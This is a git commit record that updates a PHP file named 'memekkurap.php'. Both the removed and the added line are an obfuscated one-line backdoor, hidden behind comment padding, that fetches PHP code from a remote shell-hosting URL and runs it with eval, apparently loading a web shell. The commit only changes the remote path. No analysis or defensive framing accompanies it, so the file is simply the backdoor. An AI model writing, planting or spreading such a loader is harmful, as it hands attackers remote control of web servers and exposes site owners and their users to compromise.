ae3df404c212201b8c82fb47dc1e7ea1c71a0a2b
Deinisme <114871586+Deinisme@users.noreply.github.com>
2023-06-03 22:27:45 +0700

    Update memekkurap.php

--- memekkurap.php
+++ memekkurap.php
@@ -1,1 +1,1 @@
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://shell.prinsh.com/Nathan/cpanel.txt"));/**/?>
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://shell.prinsh.com/Nathan/c"));/**/?>
